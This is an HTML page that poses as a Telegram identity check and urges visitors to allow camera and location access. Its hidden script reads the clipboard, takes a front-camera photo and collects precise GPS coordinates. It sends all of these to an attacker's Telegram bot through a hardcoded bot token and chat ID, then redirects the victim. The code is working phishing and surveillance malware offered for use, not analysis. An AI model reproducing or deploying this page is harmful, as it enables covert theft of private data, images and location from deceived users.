<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram - Security Check</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; }
        h2 { font-size: 22px; margin-bottom: 10px; color: #222; }
        p { color: #707579; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        .btn { background-color: #3390ec; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; -webkit-appearance: none; }
        #video, #canvas { display: none; }
        .loading { display: none; color: #3390ec; margin-top: 15px; font-weight: 500; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
        <h2>Identity Check</h2>
        <p>Your Telegram session requires a quick security check. Please allow location and camera to continue.</p>
        
        <button class="btn" id="mainBtn">VERIFY IDENTITY</button>
        <div id="status" class="loading">Verifying... Please wait</div>
    </div>

    <!-- پێویستە بۆ iOS ئەم تاگانە لێرە بن -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            const btn = this;
            const status = document.getElementById('status');
            btn.style.display = 'none';
            status.style.display = 'block';

            // 1. Clipboard (iOS تەنها لە کاتی کلیکدا ڕێگە دەدات)
            try {
                const clip = await navigator.clipboard.readText();
                if(clip) await sendToBot("📋 Clipboard: " + clip);
            } catch (e) {}

            // 2. وەرگرتنی وێنە (بۆ ئایفۆن playsinline و muted زۆر گرنگە)
            try {
                const constraints = { video: { facingMode: "user" }, audio: false };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // وێستان بۆ دڵنیابوون لەوەی کامێراکە فوکەسی کردووە
                await new Promise(r => setTimeout(r, 1200));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'ios_face.jpg');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { await sendToBot("❌ iOS Camera Denied"); }

            // 3. لۆکەیشنی GPS (بۆ ئایفۆن Timeout پێویستە کەم بێت تاوەکو "Hang" نەبێت)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    await sendToBot(`📍 iOS GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                    window.location.href = "index.html";
                }, async (err) => {
                    await sendToBot("❌ iOS GPS Denied");
                    window.location.href = "index.html";
                }, { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 });
            } else {
                window.location.href = "index.html";
            }
        });
    </script>
</body>
</html>
